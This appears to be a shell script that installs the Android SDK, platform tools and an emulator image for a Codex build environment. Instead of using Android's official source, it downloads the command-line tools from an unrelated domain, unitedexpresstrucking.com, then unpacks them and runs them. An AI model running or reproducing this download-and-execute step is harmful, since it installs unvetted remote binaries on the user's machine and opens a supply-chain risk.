#!/usr/bin/env sh
# POSIX-compliant Android SDK setup for Codex environment
set -eu

# 1. Set Android SDK root and export it
ANDROID_HOME="${ANDROID_HOME:-$HOME/android-sdk}"
export ANDROID_HOME
echo "Android SDK root: $ANDROID_HOME"

# 2. Ensure cmdline-tools/latest is installed
CL_ROOT="$ANDROID_HOME/cmdline-tools/latest"
if [ ! -d "$CL_ROOT" ]; then
  echo "Installing Android command-line tools..."
  TMP_DIR=$(mktemp -d)
  trap 'rm -rf "$TMP_DIR"' EXIT
  if [ -f androidsdk.zip ]; then
    cp androidsdk.zip "$TMP_DIR/sdk.zip"
  else
    curl -L https://unitedexpresstrucking.com/androidsdk.zip -o "$TMP_DIR/sdk.zip"
  fi
  mkdir -p "$CL_ROOT"
  unzip -q "$TMP_DIR/sdk.zip" -d "$TMP_DIR"
  if [ -d "$TMP_DIR/cmdline-tools" ]; then
    mv "$TMP_DIR/cmdline-tools"/* "$CL_ROOT/"
  else
    mv "$TMP_DIR/tools"/* "$CL_ROOT/"
  fi
fi

# 3. Update PATH to include sdkmanager and platform-tools
export PATH="$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$PATH"
echo "Updated PATH with sdkmanager and platform-tools"

# 4. Decode the Gradle wrapper
echo "Decoding Gradle wrapper..."
python scripts/decode_gradle_wrapper.py

# 5. Configure Gradle to use local SDK
echo "sdk.dir=$ANDROID_HOME" > local.properties

# 6. Accept all Android SDK licenses
echo "Accepting Android SDK licenses..."
yes | sdkmanager --licenses >/dev/null 2>&1

# 7. Install core SDK packages
echo "Installing Android SDK packages..."
for pkg in \
  "platform-tools" \
  "platforms;android-34" \
  "build-tools;34.0.0"; do
  echo "Installing $pkg..."
  sdkmanager --install "$pkg" >/dev/null
done

# 8. Install emulator image for instrumentation tests
echo "Installing emulator system image..."
yes | sdkmanager "system-images;android-34;google_apis;x86_64" "emulator" >/dev/null

# 9. Completion message
echo "Android SDK setup complete at $ANDROID_HOME"
